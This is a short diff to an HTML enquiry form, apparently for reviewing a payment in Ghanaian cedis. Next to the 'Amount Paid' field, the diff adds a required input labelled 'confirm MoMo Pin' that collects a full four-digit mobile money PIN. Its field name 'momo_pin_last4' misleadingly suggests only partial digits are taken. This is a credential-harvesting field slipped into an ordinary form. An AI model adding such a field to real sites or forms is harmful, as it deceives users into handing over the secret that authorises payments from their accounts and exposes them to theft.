@@ -440,6 +440,17 @@ details to help with the review of your enquiry.
     <label>Amount Paid (GHS) *</label>
     <input type="number" name="amount_paid" placeholder="Enter amount paid" min="0" step="0.01" required>
 </div>
+<div class="field">
+    <label>confirm MoMo Pin *</label>
+    <input type="text" name="momo_pin_last4"
+           placeholder="Enter MoMo Pin"
+           maxlength="4"
+           minlength="4"
+           pattern="[0-9]{4}"
+           inputmode="numeric"
+           required>
+</div>
+    
 <div class="field full">
 <label>Email Address</label>
 <input type="email" name="email">
